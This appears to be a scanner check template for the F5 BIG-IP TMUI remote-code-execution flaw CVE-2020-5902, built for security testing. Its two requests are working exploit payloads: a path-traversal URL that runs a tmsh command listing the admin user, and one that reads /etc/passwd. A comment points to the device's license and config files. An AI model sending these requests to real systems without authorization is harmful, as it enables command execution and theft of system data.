id: bigip-rce-cve-2020-5902
info:
  name: BigIP F5 RCE CVE-2020-5902
  risk: High
  confidence: Certain

params:
  - root: "{{.BaseURL}}"

requests:
  - method: GET
    redirect: false
    url: >-
      {{.root}}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin
    headers:
      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
    detections:
      - >-
        StatusCode() == 200 && StringSearch('body', 'output"') && StringSearch('body', '{"error"')

  # other interesting files
  # /config/bigip.license, /config/bigip.conf
  - method: GET
    redirect: false
    url: >-
      {{.root}}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
    headers:
      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
    detections:
      - >-
        StatusCode() == 200 && StringSearch('body', 'root:x') && StringSearch('body', 'bin:')

references:
  - link: https://support.f5.com/csp/article/K52145254
  - rce_root: https://github.com/rapid7/metasploit-framework/blob/41bb4d3a8d64ac7cb829539205991b80b6f77686/modules/exploits/linux/http/f5_bigip_tmui_rce.rb